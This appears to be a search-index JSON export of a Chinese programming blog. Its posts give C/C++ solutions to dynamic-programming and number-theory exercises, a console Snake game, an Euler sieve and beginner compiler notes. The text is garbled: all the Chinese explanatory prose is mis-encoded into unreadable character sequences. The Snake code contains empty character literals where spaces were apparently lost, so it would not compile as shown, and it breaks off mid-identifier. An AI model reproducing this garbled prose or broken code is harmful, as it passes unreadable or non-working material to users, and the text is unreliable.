dp[i - 1] + 19; else if (i % 10 == 0) dp[i] = dp[i - 1] + 10; else dp[i] = dp[i - 1] + 1; } return; } int main(void) { int t, i, a, b, sc, j; scanf(\"%d\", \u0026t); init(); for (i = 1; i \u003c= t; ++i){ scanf(\"%3d %3d %d\", \u0026a, \u0026b, \u0026sc); int ans = 0, now = 0; for (j = 0; j \u003c= sc; ++j){ now = dp[a + j] - dp[a] + dp[b + sc - j] - dp[b]; if (now\u003e ans) ans = now; } printf(\"Case %d: %d\\n\", i, ans); } return 0; } ","date":"2017-12-23","objectID":"/dp-simple/:3:1","tags":["åŠ¨æ€è§„åˆ’"],"title":"ç®€å• DP é¢˜åˆé›†","uri":"/dp-simple/"},{"categories":["ç®—æ³•"],"content":"1052 0-1 èƒŒåŒ…é—®é¢˜ å·²çŸ¥ n ä¸ªç‰©ä½“ 1,2,3,â€¦,n ä¸ä¸€ä¸ªèƒŒåŒ…ã€‚ç‰©ä½“ i çš„é‡é‡ä¸º Wi\u003e0ï¼Œä»·å€¼ä¸º Pi\u003e0 (i=1,2,â€¦,n)ï¼ŒèƒŒåŒ…å®¹é‡ä¸º M\u003e0ã€‚ æ±‚åœ¨ä¸è¶…è¿‡èƒŒåŒ…å®¹é‡çš„æƒ…å†µä¸‹ï¼Œä½¿å¾—è£…è¿›å»çš„ç‰©ä½“çš„ä»·å€¼æœ€é«˜ã€‚ ","date":"2017-12-23","objectID":"/dp-simple/:4:0","tags":["åŠ¨æ€è§„åˆ’"],"title":"ç®€å• DP é¢˜åˆé›†","uri":"/dp-simple/"},{"categories":["ç®—æ³•"],"content":"è¯´æ˜ ç»å…¸å…¥é—¨ DP é¢˜ã€‚ç”¨ä¸€ç»´æ•°ç»„å®ç°æ—¶éœ€è¦æ³¨æ„ j éœ€è¦ä» m åˆ° w é€’å‡ï¼Œè¿™ä¸åŠ¨è§„çš„ bottom-up æ€è·¯æ˜¯ä¸€è‡´çš„ã€‚ #include\u003cstdio.h\u003e int main() { int t; scanf(\"%d\", \u0026t); while(t--) { int n, m, i, j, w, v, a[100001] = {0}; scanf(\"%d%d\", \u0026n, \u0026m); for(i = 0; i \u003c n; ++i){ scanf(\"%d%d\", \u0026w, \u0026v); for(j = m; j\u003e= w; --j) if (a[j - w] + v \u003e a[j]) a[j] = a[j - w] + v; } printf(\"%d\\n\",a[m]); } return 0; } ","date":"2017-12-23","objectID":"/dp-simple/:4:1","tags":["åŠ¨æ€è§„åˆ’"],"title":"ç®€å• DP é¢˜åˆé›†","uri":"/dp-simple/"},{"categories":["ç®—æ³•"],"content":"3302 æ‰“å° æ‰“å° n ä¸ªç›¸åŒçš„å­—ç¬¦ï¼Œæ’å…¥æˆ–åˆ é™¤ä¸€ä¸ªå­—ç¬¦èŠ±è´¹çš„æ—¶é—´ä¸º xï¼Œå¤åˆ¶å½“å‰æ•´ä¸ªæ–‡æœ¬å¹¶ä¸”ç²˜è´´åœ¨åé¢çš„æ—¶é—´èŠ±è´¹ä¸º yï¼Œæ±‚å®Œæˆ n ä¸ªå­—ç¬¦çš„æ‰“å°æ‰€éœ€çš„æœ€å°èŠ±è´¹æ—¶é—´ã€‚ ","date":"2017-12-23","objectID":"/dp-simple/:5:0","tags":["åŠ¨æ€è§„åˆ’"],"title":"ç®€å• DP é¢˜åˆé›†","uri":"/dp-simple/"},{"categories":["ç®—æ³•"],"content":"è¯´æ˜ dp[i] è¡¨ç¤ºæ‰“å° i ä¸ªå­—ç¬¦éœ€è¦çš„æœ€å°æ—¶é—´ã€‚ i ä¸ºå¶æ•°æ—¶ï¼Œå¯èƒ½æ˜¯ (i-1 ä¸ªå­—ç¬¦ + æ’å…¥ä¸€ä¸ªå­—ç¬¦) / (i/2 ä¸ªå­—ç¬¦å¤åˆ¶ä¸€æ¬¡) ä¸¤ç§æ“ä½œä¹‹ä¸€äº§ç”Ÿçš„ï¼Œå–å®ƒä»¬çš„æœ€å°å€¼ã€‚ i ä¸ºå¥‡æ•°æ—¶ï¼Œå¯èƒ½æ˜¯ (i-1 ä¸ªå­—ç¬¦ + æ’å…¥ä¸€ä¸ªå­—ç¬¦) / ((i+1)/2 ä¸ªå­—ç¬¦å¤åˆ¶ä¸€æ¬¡) ä¸¤ç§æ“ä½œä¹‹ä¸€äº§ç”Ÿçš„ï¼Œå–å®ƒä»¬çš„æœ€å°å€¼ã€‚ å†™çš„æ—¶å€™ç”¨çš„ Cï¼Œè¿˜å¹¶ä¸ä¼šå®šä¹‰å®ï¼Œå¯¼è‡´ä»£ç çœ‹èµ·æ¥æ¯”è¾ƒç¹çã€‚ #include \u003cstdio.h\u003e#include \u003cmemory.h\u003etypedef long long LL; LL dp[10000001]; LL printing(int n, int x, int y) { int i; if (n == 0) return 0; if (n == 1) return x; memset(dp, 0, sizeof(dp)); for (i = 1; i \u003c= n; ++i){ if (i % 2) dp[i] = (dp[i-1]+x \u003cdp[(i+1)/2]+y+x)?dp[i-1]+x:dp[(i+1)/2]+y+x; else dp[i] = (dp[i-1]+x \u003cdp[i/2]+y)?dp[i-1]+x:dp[i/2]+y; } return dp[n]; } int main() { int n,x,y; scanf(\"%d%d%d\",\u0026n, \u0026x, \u0026y); LL ans = printing(n, x, y); printf(\"%lld\", ans); return 0; } ","date":"2017-12-23","objectID":"/dp-simple/:5:1","tags":["åŠ¨æ€è§„åˆ’"],"title":"ç®€å• DP é¢˜åˆé›†","uri":"/dp-simple/"},{"categories":["ç®—æ³•"],"content":"æ•°å¡”ç³»åˆ— ","date":"2017-12-23","objectID":"/dp-simple/:6:0","tags":["åŠ¨æ€è§„åˆ’"],"title":"ç®€å• DP é¢˜åˆé›†","uri":"/dp-simple/"},{"categories":["ç®—æ³•"],"content":"æœ€å°å’Œ ä»é¡¶éƒ¨å‡ºå‘ï¼Œåœ¨æ¯ä¸€ç»“ç‚¹å¯ä»¥é€‰æ‹©å‘å·¦èµ°æˆ–æ˜¯å‘å³èµ°ï¼Œä¸€ç›´èµ°åˆ°åº•å±‚ï¼Œè¦æ±‚æ‰¾å‡ºä¸€æ¡è·¯å¾„ï¼Œä½¿è·¯å¾„ä¸Šçš„æ•°å­—å’Œæœ€å°ã€‚ è‡ªä¸‹å‘ä¸Šæ›´æ–°æ¯ä¸€å±‚çš„æœ€å°å€¼ã€‚ #include \u003cstdio.h\u003e#include \u003cmemory.h\u003e#define min(a, b) ((a) \u003c(b) ? (a) : (b)) int dp[101], a[101][101]; int main(void) { int t, n, i, j; scanf(\"%d\", \u0026t); while(t--){ scanf(\"%d\", \u0026n); memset(dp, 0, sizeof(dp)); for (i = 0; i \u003c n; ++i) for (j = 0; j \u003c= i; ++j) scanf(\"%d\", \u0026a[i][j]); for (i = n - 1; i\u003e= 0; --i) for (j = 0; j \u003c= i; ++j) dp[j] = min(dp[j], dp[j + 1]) + a[i][j]; printf(\"%d\\n\", dp[0]); } return 0; } ","date":"2017-12-23","objectID":"/dp-simple/:6:1","tags":["åŠ¨æ€è§„åˆ’"],"title":"ç®€å• DP é¢˜åˆé›†","uri":"/dp-simple/"},{"categories":["ç®—æ³•"],"content":"æœ€å¤§å’Œ ä»ç¬¬ä¸€è¡Œçš„æ•°å¼€å§‹ï¼Œé™¤äº†æŸä¸€æ¬¡å¯ä»¥èµ°åˆ°ä¸‹ä¸€è¡Œçš„ä»»æ„ä½ç½®å¤–ï¼Œæ¯æ¬¡éƒ½åªèƒ½å·¦ä¸‹æˆ–å³ä¸‹èµ°ä¸€æ ¼ï¼Œç›´åˆ°èµ°åˆ°æœ€ä¸‹è¡Œï¼ŒæŠŠæ²¿é€”ç»è¿‡çš„æ•°å…¨éƒ¨åŠ èµ·æ¥ã€‚å¦‚ä½•èµ°ï¼Œä½¿å¾—è¿™ä¸ªå’Œå°½é‡å¤§ï¼Ÿ æ•°ç»„å¤šå»ºä¸€ç»´ï¼Œå€¼åªæœ‰ 0 å’Œ 1ï¼Œè¡¨ç¤ºæ˜¯å¦è¿˜æœ‰ä¼ é€æœºä¼šå‰©ä½™ã€‚ å¯¹äºæ¯æ¬¡æ›´æ–°ï¼Œå¦‚æœè¿˜æœ‰ä¼ é€æœºä¼šï¼Œè€ƒè™‘æ˜¯å¦ä¼ é€ã€‚ç”¨ maxn è®°å½•ç¬¬ n å±‚çš„æœ€å¤§å€¼ã€‚è¿™æ¬¡æ²¡æœ‰é¢å¤–ç”¨ dp æ•°ç»„è€Œæ˜¯ç›´æ¥è¦†ç›– a æ•°ç»„ã€‚ #include \u003ccstdio\u003e#include \u003ccstring\u003e#include \u003calgorithm\u003eusing namespace std; int a[502][502][2], maxn[502]; int main() { int t, n, i, j; scanf(\"%d\", \u0026t); while(t--){ scanf(\"%d\", \u0026n); memset(maxn, 0, sizeof(maxn)); for (i = 1; i \u003c= n; ++i) for (j = 1; j \u003c= i; ++j){ scanf(\"%d\", \u0026a[i][j][0]); a[i][j][1] = a[i][j][0]; } for (j = 1; j \u003c= n; ++j) maxn[n] = max(maxn[n], a[n][j][0]); for (i = n-1; i\u003e= 1; --i) for (j = 1; j \u003c= i; ++j){ a[i][j][0] += max(a[i+1][j][0], a[i+1][j+1][0]); maxn[i] = max(maxn[i], a[i][j][0]); a[i][j][1] += max(max(a[i+1][j][1], a[i+1][j+1][1]), maxn[i+1]); } printf(\"%d\\n\", a[1][1][1]); } return 0; } ","date":"2017-12-23","objectID":"/dp-simple/:6:2","tags":["åŠ¨æ€è§„åˆ’"],"title":"ç®€å• DP é¢˜åˆé›†","uri":"/dp-simple/"},{"categories":["ç®—æ³•"],"content":"ä¸ªä½æ•°æœ€å¤§å’Œ ä»ç¬¬ä¸€è¡Œçš„æ•°å¼€å§‹ï¼Œæ¯æ¬¡éƒ½åªèƒ½å·¦ä¸‹æˆ–å³ä¸‹èµ°ä¸€æ ¼ï¼Œç›´åˆ°èµ°åˆ°æœ€ä¸‹è¡Œï¼ŒæŠŠæ²¿é€”ç»è¿‡çš„æ•°å…¨éƒ¨åŠ èµ·æ¥ã€‚å¦‚ä½•èµ°ï¼Œä½¿å¾—è¿™ä¸ªå’Œçš„ä¸ªä½æ•°å°½é‡å¤§ï¼Ÿ å¤šå»ºä¸€ç»´æ¥è®°å½•ä¸ªä½æ•°ï¼Œæœ€åæšä¸¾ä¸ªä½æ•°å³å¯ã€‚ #include \u003cstdio.h\u003e#include \u003cmemory.h\u003e int dp[101][101][11], a[101][101]; int main(void) { int t, n, i, j, k; scanf(\"%d\", \u0026t); while(t--){ memset(dp, 0, sizeof(dp)); scanf(\"%d\", \u0026n); for (i = 0; i \u003c n; ++i) for (j = 0; j \u003c= i; ++j) scanf(\"%d\", \u0026a[i][j]); for (i = 0; i \u003c n; ++i) dp[n - 1][i][a[n - 1][i] % 10] = 1; for (i = n - 2; i\u003e= 0; --i) for (j = 0; j \u003c= i; ++j) for (k = 0; k \u003c 10; ++k) if (dp[i + 1][j][k] || dp[i + 1][j + 1][k]) dp[i][j][(k + a[i][j]) % 10] = 1; for (i = 9; i\u003e= 0; --i) if (dp[0][0][i]){printf(\"%d\\n\", i); break;} } return 0; } ","date":"2017-12-23","objectID":"/dp-simple/:6:3","tags":["åŠ¨æ€è§„åˆ’"],"title":"ç®€å• DP é¢˜åˆé›†","uri":"/dp-simple/"},{"categories":["ç®—æ³•"],"content":"ä¸ªä½æ•°æœ€å¤§ç§¯ ä»ç¬¬ä¸€è¡Œçš„æ•°å¼€å§‹ï¼Œæ¯æ¬¡éƒ½åªèƒ½å·¦ä¸‹æˆ–å³ä¸‹èµ°ä¸€æ ¼ï¼Œç›´åˆ°èµ°åˆ°æœ€ä¸‹è¡Œï¼ŒæŠŠæ²¿é€”ç»è¿‡çš„æ•°å…¨éƒ¨ä¹˜èµ·æ¥ã€‚å¦‚ä½•èµ°ï¼Œä½¿å¾—ä¸ªä½æ•°çš„ç§¯å°½é‡å¤§ ? å’Œä¸Šä¸€é¢˜åŒç†ï¼Œå°†åŠ æ³•æ¢æˆä¹˜æ³•ã€‚ #include \u003ccstdio\u003e#include \u003ccstring\u003e int dp[101][101][11], a[101][101]; int main(void) { int t, n, i, j, k; scanf(\"%d\", \u0026t); while(t--){ memset(dp, 0, sizeof(dp)); scanf(\"%d\", \u0026n); for (i = 0; i \u003c n; ++i) for (j = 0; j \u003c= i; ++j) scanf(\"%d\", \u0026a[i][j]); for (i = 0; i \u003c n; ++i) dp[n - 1][i][a[n - 1][i] % 10] = 1; for (i = n - 2; i\u003e= 0; --i) for (j = 0; j \u003c= i; ++j) for (k = 0; k \u003c 10; ++k) if (dp[i + 1][j][k] || dp[i + 1][j + 1][k]) dp[i][j][(k * a[i][j]) % 10] = 1; for (i = 9; i\u003e= 0; --i) if (dp[0][0][i]){printf(\"%d\\n\", i); break;} } return 0; } ","date":"2017-12-23","objectID":"/dp-simple/:6:4","tags":["åŠ¨æ€è§„åˆ’"],"title":"ç®€å• DP é¢˜åˆé›†","uri":"/dp-simple/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"å­¦ä¸€é—¨è¯­è¨€ä¸ä»…è¦ä¼šå†™ Hello Worldï¼Œè¿˜è¦ä¼šå†™è´ªåƒè›‡ã€‚ ","date":"2017-12-16","objectID":"/glu-snake/:0:0","tags":["é¡¹ç›®","C/C++"],"title":"C++ ç»ƒä¹  | è´ªåƒè›‡","uri":"/glu-snake/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"ä»£ç  å¯¹è¿™ä¸ªä¸åˆ° 200 è¡Œçš„å‘½ä»¤è¡Œæ¸¸æˆè¿˜ç®—æ»¡æ„ã€‚ä»£ç å¦‚ä¸‹ï¼š #include \u003ciostream\u003e#include \u003ccstdio\u003e#include \u003ccstdlib\u003e#include \u003cctime\u003e#include \u003cwindows.h\u003e#include \u003cconio.h\u003e#define N 28 #define UP 72 #define DOWN 80 #define LEFT 75 #define RIGHT 77 using namespace std; typedef struct{int x, y;}point; point snake[400], food, next_head;//next_head pos of head char game_map[N][N]; int head, tail; int lv, len, interval; char dir; void gotoxy(int x, int y)//prevent blinking { HANDLE hConsoleOutput; COORD dwCursorPosition; dwCursorPosition.X = x; dwCursorPosition.Y = y; hConsoleOutput = GetStdHandle(STD_OUTPUT_HANDLE); SetConsoleCursorPosition(hConsoleOutput, dwCursorPosition); } inline void update(char game_map[][N], int lv, int len, int interval) { gotoxy(0, 0); int i, j; printf(\"\\n\"); for (i = 0; i \u003c N; ++i){ printf(\"\\t\\t\"); for (j = 0; j \u003c N; ++j) printf(\"%c\", game_map[i][j]); switch(i){ case 0: printf(\"\\tLevel: %d\", lv); break; case 4: printf(\"\\tLength: %d\", len); break; case 8: printf(\"\\tInterval: %3d ms\", interval); break; case 18: printf(\"\\tPress Space to Pause\"); } printf(\"\\n\"); } } inline void rand_food() { srand(int(time(0))); do{ food.x = rand() % 20 + 1; food.y = rand() % 20 + 1; }while (game_map[food.x][food.y] != ''); game_map[food.x][food.y] = '$'; } inline void init() { int i, j; for (i = 1; i \u003c= N-2; ++i) for (j = 1; j \u003c= N-2; ++j) game_map[i][j] = ' '; for (i = 0; i \u003c= N-1; ++i) game_map[0][i] = game_map[N-1][i] = game_map[i][0] = game_map[i][N-1] = '#'; game_map[1][1] = game_map[1][2] = game_map[1][3] = game_map[1][4] = '@'; game_map[1][5] = 'Q'; head = 4; tail = 0; snake[head].x = 1; snake[head].y = 5; snake[tail].x = 1; snake[tail].y = 1; snake[1].x = 1; snake[1].y = 2; snake[2].x = 1; snake[2].y = 3; snake[3].x = 1; snake[3].y = 4; rand_food(); lv = 0; len = 5; interval = 400; dir = RIGHT; puts(\"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\t\\t\\t\\t\\t\\tPress Any Key\"); getch(); update(game_map, lv, len, interval); } inline int mov() { bool timeover = true; double start = (double)clock() / CLOCKS_PER_SEC; //get total time char tmp; here: //wait for 1s while ((timeover = ((double)clock() / CLOCKS_PER_SEC - start \u003c= interval / 1000.0)) \u0026\u0026 !_kbhit()); if (timeover){ char c = getch(); if (c ==' ') { printf(\"Game Paused\"); while (getch() != ''); system(\"cls\"); update(game_map, lv, len, interval); } else if ((c != UP \u0026\u0026 c != DOWN \u0026\u0026 c != LEFT \u0026\u0026 c != RIGHT) || (dir == UP \u0026\u0026 c == DOWN) || (dir == DOWN \u0026\u0026 c == UP) || (dir == LEFT \u0026\u0026 c == RIGHT) || (dir == RIGHT \u0026\u0026 c == LEFT)) goto here; else dir = c; } switch (dir){ case UP: next_head.x = snake[head].x - 1; next_head.y = snake[head].y; break; case DOWN: next_head.x = snake[head].x + 1; next_head.y = snake[head].y; break; case LEFT: next_head.x = snake[head].x; next_head.y = snake[head].y - 1; break; case RIGHT: next_head.x = snake[head].x; next_head.y = snake[head].y + 1; break; } if ((!next_head.x || next_head.x == N-1 || !next_head.y || next_head.y == N-1) || //hit the wall (game_map[next_head.x][next_head.y] != '' \u0026\u0026 !(next_head.x == food.x \u0026\u0026 next_head.y == food.y))){ //hit itself puts(\"Game Over!\\nReplay? y/n\"); while (tolower(tmp = getchar()) != 'y' \u0026\u0026 tolower(tmp) != 'n'); if (tmp =='y') return 2; else return 0; } if (len == 100){ puts(\"Congratulations!\\nReplay? y/n\"); while (tolower(tmp = getchar()) != 'y' \u0026\u0026 tolower(tmp) != 'n'); if (tmp =='y') return 2; else return 0; } return 1; } inline void eating() { ++len; int grade = len / 5 - 1; if (grade != lv){ lv = grade; if (interval\u003e 50) interval = 400 - lv * 50; } game_map[next_head.x][next_head.y] = 'Q'; //change head pos game_map[snake[head].x][snake[head].y] = '@'; //head becomes body head = (head + 1) % 400; snake[head].x = next_head.x; snake[head].y = next_head.y; //change head pos rand_food(); update(game_map, lv, len, interval); } inline void not_eating() { game_map[snake[tail].x][snake[tail].y] = ''; //tail becomes' ' tail = (tail + 1) % 400; game_map[next_head.x][next_head.y] = 'Q'; game_map[snake[head].x][snake[head].y] = '@'; head = (head + 1) % 400; snake[he","date":"2017-12-16","objectID":"/glu-snake/:1:0","tags":["é¡¹ç›®","C/C++"],"title":"C++ ç»ƒä¹  | è´ªåƒè›‡","uri":"/glu-snake/"},{"categories":["ç®—æ³•"],"content":"æˆ‘æœ€å–œæ¬¢çš„æ±‚ç´ æ•°æ–¹æ³•ã€‚è¿™ä¹Ÿæ˜¯æˆ‘æœ€å¸¸å›é¡¾ï¼ˆæŠ„ä»£ç ï¼‰çš„ä¸€ç¯‡æ–‡ç« ã€‚ ","date":"2017-12-04","objectID":"/euler-sieve/:0:0","tags":["æ•°å­¦"],"title":"æ¬§æ‹‰ç­›æ³•æ±‚ç´ æ•°","uri":"/euler-sieve/"},{"categories":["ç®—æ³•"],"content":"C ä»£ç  #include \u003cstdio.h\u003e#include \u003cstdbool.h\u003e bool flag[10001] = {0}; int p[10001] = {0}; int main() { int i, n, cnt = 0, j; scanf(\"%d\", \u0026n); for (i = 2; i \u003c= n; ++i){ if (flag[i] == 0) p[cnt++] = i; for (j = 0; j \u003c cnt \u0026\u0026 i * p[j] \u003c= n; ++j){ flag[i * p[j]] = 1; if (i % p[j] == 0) break; } } for (i = 0; i \u003c cnt; ++i) i == cnt - 1 ? printf(\"%d\\n\", p[i]) : printf(\"%d\", p[i]); return 0; } ","date":"2017-12-04","objectID":"/euler-sieve/:1:0","tags":["æ•°å­¦"],"title":"æ¬§æ‹‰ç­›æ³•æ±‚ç´ æ•°","uri":"/euler-sieve/"},{"categories":["ç®—æ³•"],"content":"è¯´æ˜ flag æ ‡è®°ä¸‹æ ‡æ˜¯å¦ä¸ºåˆæ•° p æŒ‰é¡ºåºå­˜æ”¾ç´ æ•° flag[i * p[j]] = 1 ç­›æ‰ i è¿™ä¸€ç´ æ•°çš„ ** ç´ æ•°å€æ•° **ã€‚ è‹¥ i èƒ½æ•´é™¤ p[j] åˆ™è·³å‡ºå¾ªç¯ï¼Œç­‰åˆ° p[j]==i æ—¶å†ç­›å» i*p[j] è¿™ä¸ªæ•°ã€‚å³ä»…åœ¨åˆæ•°çš„æœ€å¤§å› å­ä½œä¸ºä¹˜æ•°æ—¶ç­›å»è¿™ä¸€åˆæ•°ã€‚ æ—¶é—´å¤æ‚åº¦ O(n) ","date":"2017-12-04","objectID":"/euler-sieve/:2:0","tags":["æ•°å­¦"],"title":"æ¬§æ‹‰ç­›æ³•æ±‚ç´ æ•°","uri":"/euler-sieve/"},{"categories":["ç®—æ³•"],"content":"C++ ç‰ˆæœ¬ å®ç°ä¸Šæœ‰æ‰€æ”¹åŠ¨ã€‚ #include \u003cbits/stdc++.h\u003eusing namespace std; const int maxn = 1e7+5; bool np[maxn]{true,true}; vector\u003cint\u003e prime; int main() { int n, m, x; cin \u003e\u003e n \u003e\u003e m; for (int i = 2; i \u003c= n; ++i) { if (!np[i]) prime.push_back(i); for (int j = 0; j \u003c prime.size() \u0026\u0026 i*prime[j] \u003c= n; ++j) { np[i*prime[j]] = true; if (i % prime[j] == 0) break; } } for (int i = 1; i \u003c= m; ++i) { scanf(\"%d\", \u0026x); printf(\"%s\\n\", np[x] ? \"No\" : \"Yes\"); } return 0; } ","date":"2017-12-04","objectID":"/euler-sieve/:3:0","tags":["æ•°å­¦"],"title":"æ¬§æ‹‰ç­›æ³•æ±‚ç´ æ•°","uri":"/euler-sieve/"},{"categories":["ç®—æ³•"],"content":"æ€»æ˜¯è®©äººå¤´ç–¼åˆä»¤äººç€è¿·çš„æ•°å­¦é—®é¢˜ã€‚ ","date":"2017-11-08","objectID":"/math-problems/:0:0","tags":["æ•°å­¦"],"title":"å·§ç®—æ•°å­¦é—®é¢˜","uri":"/math-problems/"},{"categories":["ç®—æ³•"],"content":"æ±‚ $n!$ é¦–ä½æ•° ä½¿ç”¨æ–¯ç‰¹æ—å…¬å¼å¾—åˆ°è¿‘ä¼¼ç»“æœï¼š $$ \\lim_{n\\to+\\infty} {n!\\over{\\sqrt {2 \\pi n}} ({n\\over e})^n} = 1 $$ ä¹‹åç”¨ 10 çš„å¹‚è®¡ç®—å–é¦–ä½å³å¯ï¼Œæ³¨æ„æ•°å­—è¾ƒå°æ—¶ç‰¹åˆ¤ï¼Œä»£ç å¦‚ä¸‹ï¼š #include \u003cstdio.h\u003e#include \u003cmath.h\u003e const double PI = 3.14159265358979; const double E = 2.718281828; int main() { int n,fn; double log_n_fac; while (scanf(\"%d\", \u0026n) != EOF){ log_n_fac = 0.5 * log10(2 * PI *(double)n) + (double)n * log10((double)n / E); log_n_fac -=(int)log_n_fac; fn = pow(10, log_n_fac);//Stirling's approximation switch(n){ case 0:printf(\"1\\n\");break; case 1:printf(\"1\\n\");break; case 2:printf(\"2\\n\");break; case 3:printf(\"6\\n\");break; case 7:printf(\"5\\n\");break; case 8:printf(\"4\\n\");break; default:printf(\"%d\\n\", fn); } } return 0; } ","date":"2017-11-08","objectID":"/math-problems/:1:0","tags":["æ•°å­¦"],"title":"å·§ç®—æ•°å­¦é—®é¢˜","uri":"/math-problems/"},{"categories":["ç®—æ³•"],"content":"æ±‚ $n^n$ é¦–ä½ æ–¹æ³•ç±»ä¼¼ï¼Œä»£ç ï¼š #include \u003cstdio.h\u003e#include \u003cmath.h\u003e int main() { int n; scanf(\"%d\",\u0026n); while(n != 0){ printf(\"%d\\n\",(int)pow(10,n*log10(n)-(int)(n*log10(n)))); scanf(\"%d\",\u0026n); } return 0; } ","date":"2017-11-08","objectID":"/math-problems/:2:0","tags":["æ•°å­¦"],"title":"å·§ç®—æ•°å­¦é—®é¢˜","uri":"/math-problems/"},{"categories":["ç®—æ³•"],"content":"æ•´æ•°è´¨å› å­åˆ†è§£ ä»å°åˆ°å¤§æšä¸¾å› æ•°ï¼Œå¦‚æœè¿™ä¸ªå› æ•°ä¸æ˜¯ç´ æ•°ï¼ˆå¦‚ 15ï¼‰ï¼Œé‚£ä¹ˆä¹‹å‰æšä¸¾è¿‡çš„ç´ æ•°å·²ç»æ¶ˆè€—æ‰äº†è¿™ä¸ªå› æ•°ï¼ˆå¦‚ 3 å’Œ 5ï¼‰ï¼Œå› æ­¤ n%15 ä¸ä¼šä¸º 0ã€‚æ‰€ä»¥è¿™é¢˜å¹¶ä¸éœ€è¦ç­›é€‰ç´ æ•°ã€‚ #include \u003cstdio.h\u003e int n; void solve(){ int i; int m = n; for (i = 2; i \u003c= n; i++){ int cnt = 0; if (m % i) continue; while (m % i == 0){ m /= i; cnt++; } printf(\"(%d,%d)\", i, cnt); if (m == 1) break; } printf(\"\\n\"); } int main(void) { int t,i; scanf(\"%d\", \u0026t); for (i = 0; i \u003c t; i++){ scanf(\"%d\", \u0026n); solve(); } return 0; } ","date":"2017-11-08","objectID":"/math-problems/:3:0","tags":["æ•°å­¦"],"title":"å·§ç®—æ•°å­¦é—®é¢˜","uri":"/math-problems/"},{"categories":["ç®—æ³•"],"content":"$n!$ å³ç«¯çš„ 0 çš„ä¸ªæ•° ä»¤ $n!=5^m 2 ^p x$ï¼Œ$m,p,x$ ä¸ºéè´Ÿæ•´æ•°ã€‚åŒæ—¶ç”±äº $n!$ ä¸­ 2 çš„å€æ•°è¿œå¤šäº 5 çš„å€æ•°ï¼Œå³ $p \u003e m$ï¼Œæ‰€ä»¥ m å³ä¸ºç­”æ¡ˆã€‚è¦å¾—åˆ° mï¼Œé¦–å…ˆæ‰¾ä» 1 åˆ° n ä¸­ 5 çš„å€æ•°ï¼Œå³ $\\frac{n}{5}$ï¼Œè€Œ $25=5^2$ï¼Œä¸€ä¸ªæ•°å°±å«æœ‰ä¸¤ä¸ª 5 åœ¨å†…ï¼Œå› æ­¤ç¬¬äºŒè½®æˆ‘ä»¬æ‰¾ä» 1 åˆ° $\\frac{n}{5}$ ä¸­ 5 çš„å€æ•°ã€‚ç”±äºç¬¬ä¸€è½®ä¸­å·²ç»è¢«æ‹¿æ‰äº†ä¸€ä¸ª 5ï¼Œç¬¬äºŒè½® 25 å°±åªéœ€å†æ‹¿å‡ºä¸€ä¸ª 5 å³å¯ï¼Œ$\\frac{n}{25}$ã€‚ç¬¬ä¸‰è½®åˆ™ $\\frac{n}{125}$ï¼Œç¬¬ $i$ è½® $\\frac{n}{5^i}$ï¼Œä»¥æ­¤ç±»æ¨ï¼š #include \u003cstdio.h\u003e int main() { int t,i,n,m,z; scanf(\"%d\", \u0026t); for (i = 0; i \u003c t; i++){ scanf(\"%d\", \u0026n); m = 5;z = 0; while (n\u003e= m){ z += n / m; m *= 5; } printf(\"case #%d:\\n%d\\n\", i, z); } return 0; } ","date":"2017-11-08","objectID":"/math-problems/:4:0","tags":["æ•°å­¦"],"title":"å·§ç®—æ•°å­¦é—®é¢˜","uri":"/math-problems/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"ç¬¬ä¸€ç¯‡åšæ–‡ã€‚ ","date":"2017-11-08","objectID":"/newbie-note/:0:0","tags":["C/C++"],"title":"é—®é¢˜ç¬”è®°","uri":"/newbie-note/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"å…³äºç±»å‹ CodeBlocks ä½¿ç”¨ MinGW ç¼–è¯‘å™¨ï¼Œlong long ç±»å‹è¾“å‡ºè¡¨ç¤ºä¸º \"%I64d\"ï¼Œä¸” __int64 åˆæ³•ï¼› EOJ ä½¿ç”¨çš„ä¼¼ä¹æ˜¯ g++ çš„ Linux ç‰ˆæœ¬ç¼–è¯‘å™¨ï¼Œlong long ç±»å‹è¾“å‡ºè¡¨ç¤ºä¸º \"%lld\"ï¼Œ ä¸” __int64 ä¸åˆæ³•ï¼› long double ç±»å‹æ˜¯åˆæ³•çš„ï¼Œä½†æ˜¯åœ¨ MinGW ç¼–è¯‘å™¨ä¸­ä¸èƒ½æ ¼å¼åŒ–è¾“å…¥ / è¾“å‡ºã€‚%llfï¼Œ%Lf è¿™äº›éƒ½ä¸è¡Œã€‚ ","date":"2017-11-08","objectID":"/newbie-note/:1:0","tags":["C/C++"],"title":"é—®é¢˜ç¬”è®°","uri":"/newbie-note/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"å…³äº ILE Idleness Limit Exceeded å¸¸è§äºäº¤äº’é¢˜ã€‚ åœ¨ä½¿ç”¨å¤šä¸ªè¾“å‡ºå‡½æ•°è¿ç»­è¾“å‡ºæ—¶ï¼Œæœ‰å¯èƒ½äº§ç”Ÿè¾“å‡ºé”™è¯¯ï¼Œå› ä¸ºåœ¨ä¸Šä¸€ä¸ªæ•°æ®è¿˜åœ¨è¾“å‡ºç¼“å†²åŒºä¸­æ—¶ï¼Œä¸‹ä¸€ä¸ª printf å°±æŠŠå¦ä¸€ä¸ªæ•°æ®åŠ å…¥è¾“å‡ºç¼“å†²åŒºï¼Œå†²æ‰äº†åŸæ¥çš„æ•°æ®ï¼Œé€ æˆè¾“å‡ºé”™è¯¯ã€‚ è§£å†³æ–¹æ¡ˆï¼š åœ¨ printf ååŠ ä¸Š fflush(stdout)ï¼› ä½¿ç”¨ cout\u003c\u003cendl è¾“å‡ºä¼¼ä¹æ•ˆæœç­‰åŒï¼Ÿ ","date":"2017-11-08","objectID":"/newbie-note/:2:0","tags":["C/C++"],"title":"é—®é¢˜ç¬”è®°","uri":"/newbie-note/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"å…³äºå…¶ä»–æ³¨æ„äº‹é¡¹ å˜é‡ / æ•°ç»„çš„åˆå§‹åŒ– scanf åå›è½¦ç¬¦çš„å¸æ”¶ gets çš„ä¸å®‰å…¨æ€§ getline å¤šæ¬¡ä½¿ç”¨æ³¨æ„æ·»åŠ  str = \"\\n\"; getline(cin, str); EOJ ç¼–è¯‘å™¨å¯¹ getchar(); ... gets(); çš„æ”¯æŒä¼¼ä¹ä¸å¤ªå¥½ï¼Ÿ ç»å¸¸æŠŠ == å†™æˆ = 